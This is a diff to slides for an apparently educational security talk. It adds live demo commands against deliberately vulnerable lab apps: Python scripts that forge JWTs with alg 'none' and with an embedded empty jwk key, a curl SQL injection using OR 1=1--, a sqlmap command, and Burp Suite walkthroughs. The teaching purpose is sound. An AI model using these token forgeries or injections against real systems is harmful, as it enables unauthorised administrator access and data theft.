@@ -344,16 +344,61 @@ compared in constant time, and the comparison is on raw bytes.
 
 # Demo 1: the attack
 
+Everything below is typed live. Watch the status codes.
+
 ```bash
-BASE=https://northwind-01-session-forge.vercel.app \
-  bash apps/solve/solve-01.sh
+BASE=https://northwind-01-session-forge.vercel.app
 ```
 
-1. Sign in as `wiener`. Capture the session cookie.
-2. Replay it against `/admin` → **403**. The check works.
-3. Rebuild the token: `alg` → `none`, `sub` → `administrator`, signature
-   emptied, trailing dot kept. **No cryptography is performed.**
-4. Replay → the administration page, and the flag.
+**1. Sign in as a normal employee.** The token arrives in the response:
+
+```bash
+curl -s -c jar.txt -o /dev/null -X POST \
+  -d 'username=wiener&password=peter' "$BASE/login"
+
+set-cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJub3J0a…
+            Path=/; HttpOnly; SameSite=Lax; Secure
+```
+
+**2. Replay that token against the admin page.** The boundary works:
+
+```bash
+curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
+# HTTP 403
+```
+
+**3. Rebuild the token.** `alg` becomes `none`, `sub` becomes
+`administrator`, the signature is emptied, and the trailing dot is kept because
+the parser splits on it:
+
+```bash
+TOKEN=$(awk '/session/{print $7}' jar.txt)
+
+FORGED=$(python3 - <<'PY'
+import base64, json, time
+def b64(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+now = int(time.time())
+header  = {"alg": "none", "typ": "JWT"}
+payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600,
+           "sub": "administrator", "name": "Wiener Vogel"}
+print(b64(json.dumps(header,  separators=(",", ":")).encode()) + "." +
+      b64(json.dumps(payload, separators=(",", ":")).encode()) + ".")
+PY
+)
+
+echo "$FORGED"
+# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJub3J0aHdpbmQuc3VwcGx5Iiwi…
+```
+
+Three edits, and **no cryptography is performed**: `alg: none` means there is
+no signature to compute.
+
+**4. Replay it.** Same request, different cookie:
+
+```bash
+curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}'
+# G24{N0t_4_Cl4im_V3r1f13d}
+```
 
 An empty signature over an unverified token is indistinguishable from a real
 one to a server that never checked.
@@ -361,6 +406,14 @@ one to a server that never checked.
 <!--
 Type the payload on screen if you can. The 'none' algorithm performing no
 maths whatsoever is the memorable moment.
+
+In Burp Suite rather than curl: intercept the POST to /login, read the session
+cookie out of the Set-Cookie header, then send GET /admin to Repeater with that
+cookie to confirm the 403. The JWT Editor extension, from the BApp store,
+decodes and re-encodes the token in place: switch the message editor to the
+JSON Web Token tab, set the header's alg to none, change the sub claim to
+administrator, and send the embedded request directly to Repeater. No manual
+base64 required, which is the honest way to do it in a real engagement.
 -->
 
 ---
@@ -473,11 +526,25 @@ WHERE category = 'Home' OR 1=1--' AND classification = 'public'
 - `OR 1=1` is **always true**
 - `--` **comments out the rest of the line**, including the clearance filter
 
+Watch the row count change between two requests that differ only in one
+value:
+
 ```bash
-BASE=https://northwind-02-clearance.vercel.app bash apps/solve/solve-02.sh
+BASE=https://northwind-02-clearance.vercel.app
+
+curl -s -G --data-urlencode 'category=Home' "$BASE/catalogue" \
+  | grep -oE 'NW-[A-Z0-9-]+' | sort -u
+# NW-HOM-101  NW-HOM-102  NW-HOM-103  NW-HOM-104
 ```
 
-4 rows → 16 rows, including the withheld trade lines and the flag.
+```bash
+curl -s -G --data-urlencode "category=Home' OR 1=1--" "$BASE/catalogue" \
+  | grep -oE 'NW-[A-Z0-9-]+|G24\{[^}]+\}' | sort -u
+# NW-GFT-301 … NW-TRD-501  NW-TRD-502  NW-TRD-503  NW-TRD-902  G24{InpuT_Becam3_C0d3}
+```
+
+4 rows becomes 16, including the withheld trade lines and the flag. The
+`UNION` variant shown earlier then dumps the schema itself.
 
 <!--
 Build the query on screen, character by character. Beginners find the
@@ -508,6 +575,17 @@ That reads the database's own schema. Arbitrary read, not just a bypass.
 <!--
 Both of these are the kind of thing that makes a demo fail on the day. They
 are here so nobody in the audience loses twenty minutes to them.
+-->
+
+---
+
+<!--
+In Burp Suite: intercept GET /catalogue?category=Home and send it to Repeater.
+Edit the parameter value to Home' OR 1=1-- and resend. Repeater shows the row
+count changing with the response size in the footer, which is a quick sanity
+check that the injection did something before you read the body. sqlmap finds
+this unaided, so it is worth running once as confirmation:
+sqlmap -u "$BASE/catalogue?category=Home" --batch --risk=2 --level=3
 -->
 
 ---
@@ -598,11 +676,17 @@ lines apart:
 One is escaped. The other is not. The browser cannot tell which characters were
 meant as text.
 
+First, from a terminal. This is what an attacker gets:
+
 ```bash
-BASE=https://northwind-03-reflector.vercel.app python3 apps/solve/solve-03.py
+BASE=https://northwind-03-reflector.vercel.app
+
+curl -s -H 'X-Requested-With: XMLHttpRequest' "$BASE/console"
+# { "error": "administrator session required" }
 ```
 
-`app/console/route.js` has two gates:
+The flag is not here and cannot be reached from a shell. `app/console/route.js`
+has two gates:
 
 ```js
 if (claims?.sub !== 'administrator') return json({ ... }, 403);
@@ -611,18 +695,24 @@ if (request.headers.get('x-requested-with') !== 'XMLHttpRequest') {
 }
 ```
 
-The payload calls that console, and it refuses requests from a terminal:
+So the flag cannot be fetched from a shell. It can only be read by a
+**browser executing script in an administrator's session**, which is exactly
+what the injected script does. Sign in as the administrator, open the crafted
+search URL, and watch the page title change to the flag as the script runs.
 
-```
-HTTP 403  administrator session required
-```
-
-So the flag cannot be fetched from a shell. It can only be read by a **browser
-executing script in an administrator's session**.
+No terminal can substitute for that step, which is why this one application
+needs a real browser.
 
 <!--
 This is why a browser is required and a curl loop is not. The proof of impact
 is that code ran, not that a request was malformed.
+
+In Burp Suite: send the crafted URL through the browser configured to use it
+as its proxy, so the injected request appears in Proxy history. Repeater shows
+the fetch to /console with the X-Requested-With header the server demands,
+sent from the victim's session. That single line in the history is the evidence
+that this was script execution rather than a crafted request, and it is worth
+pointing at explicitly.
 -->
 
 ---
@@ -710,7 +800,37 @@ if (header.jwk && typeof header.jwk.k === 'string') {
 ```
 
 ```bash
-BASE=https://northwind-04-keyring.vercel.app bash apps/solve/solve-04.sh
+BASE=https://northwind-04-keyring.vercel.app
+
+curl -s -c jar.txt -o /dev/null -X POST \
+  -d 'username=wiener&password=peter' "$BASE/login"
+
+curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
+# HTTP 403
+```
+
+Now the same token with a key attached, and a signature made with the empty
+string:
+
+```bash
+FORGED=$(python3 - <<'PY'
+import base64, hashlib, hmac, json, time
+def b64(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+now = int(time.time())
+header  = {"alg": "HS256", "typ": "JWT",
+           "jwk": {"kty": "oct", "kid": "attacker", "k": ""}}
+payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600,
+           "sub": "administrator"}
+signing_input = ".".join(
+    b64(json.dumps(part, separators=(",", ":")).encode())
+    for part in (header, payload))
+sig = hmac.new(b"", signing_input.encode(), hashlib.sha256).digest()
+print(f"{signing_input}.{b64(sig)}")
+PY
+)
+
+curl -s -H "Cookie: session=$FORGED" -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
+# HTTP 200
 ```
 
 Genuine token → **403**. Forged token with an embedded empty key → **200** and
@@ -725,6 +845,43 @@ An earlier version of this application used kid path traversal to read
 /dev/null. That works on a laptop and cannot work on a serverless platform,
 whose sandbox refuses traversal reads. Same lesson, and it now behaves
 identically everywhere.
+-->
+
+---
+
+<!--
+In Burp Suite: intercept the login response and copy the token, then send
+GET /admin to Repeater with the forged cookie. The JWT Editor extension can
+also add an arbitrary header claim, so the jwk object can be pasted into the
+header tab and the token re-signed with an empty key, which is a good way to
+show that the extension does not need to understand the attack, only the
+format.
+-->
+
+---
+
+# The same four, in Burp Suite
+
+Everything just shown by hand is what a proxy makes routine.
+
+| | Where in Burp | What you do |
+|---|---|---|
+| **01** | JWT Editor extension (BApp store) | Re-encode the token in the message editor: `alg` to `none`, `sub` to `administrator`, send to Repeater |
+| **02** | Repeater | Intercept `GET /catalogue`, edit the parameter, resend. `sqlmap -u … --batch` also finds it unaided |
+| **03** | Proxy history | Proxy the browser, open the crafted URL, and read the injected `fetch('/console')` in the history |
+| **04** | JWT Editor extension | Add an arbitrary header claim carrying the `jwk`, re-sign with an empty key |
+
+Two habits worth keeping:
+
+- **Confirm the boundary before you bypass it.** Replay the genuine token first.
+  A 403 afterwards is evidence; without it, it may just be a broken cookie.
+- **Read the footer.** Response size and status change long before you have
+  read the body, which makes them a fast sanity check.
+
+<!--
+The extension does not need to understand the attack, only the format. That is
+the honest way to describe every tool in this talk: they move bytes, and the
+mechanism is in the server.
 -->
 
 ---
